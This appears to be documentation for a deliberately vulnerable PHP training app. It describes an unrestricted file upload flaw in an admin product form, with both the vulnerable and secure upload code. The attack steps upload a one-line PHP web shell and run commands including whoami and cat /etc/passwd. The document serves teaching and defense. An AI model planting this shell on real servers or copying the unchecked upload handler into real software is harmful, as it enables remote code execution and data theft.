# 12 — Unrestricted File Upload

## Endpoint
POST /admin/add-product.php  (field: image)

## Vulnerability
In VULNERABLE mode, the upload handler performs no validation:
- no extension whitelist
- no MIME type check
- original filename preserved

A `.php` file uploaded here is stored under public/uploads/products/ and
is executed by PHP when requested — full remote code execution.

## Vulnerable code
File: public/admin/add-product.php

    $fileName = time() . "_" . basename($_FILES['image']['name']);
    $uploadPath = $uploadDirectory . $fileName;

    move_uploaded_file($_FILES['image']['tmp_name'], $uploadPath);

## Attack
1. Mode = VULNERABLE. Log in as admin.
2. Go to /admin/add-product.php
3. Fill in product details.
4. In "Product Image", upload a file named shell.php containing:

       <?php system($_GET['cmd']); ?>

5. Save product.
6. Visit /uploads/products/<timestamp>_shell.php?cmd=id
7. Server executes the command and returns output — RCE confirmed.

Try:
    /uploads/products/<filename>.php?cmd=whoami
    /uploads/products/<filename>.php?cmd=cat%20/etc/passwd

## Defense (secure mode)
    $allowedExt = ['jpg','jpeg','png','gif','webp'];
    $ext = strtolower(pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExt, true)) die("Invalid file type.");

    $mime = mime_content_type($_FILES['image']['tmp_name']);
    if (!in_array($mime, ['image/jpeg','image/png','image/gif','image/webp'], true))
        die("Invalid MIME type.");

    $fileName = bin2hex(random_bytes(16)) . '.' . $ext;

Three layers:
1. Extension whitelist
2. MIME type check
3. Randomized filename

Additional hardening:
- Store uploads outside the web root (served via proxy)
- Disable PHP execution in the uploads directory (Apache: php_flag engine off)
- Scan uploads with AV
- Limit file size
- Rename with a fixed internal ID, not user-provided content

## Verified
- VULNERABLE: shell.php accepted → /uploads/products/...php?cmd=id returns output.
- SECURE:     same shell.php rejected → "Invalid file type".
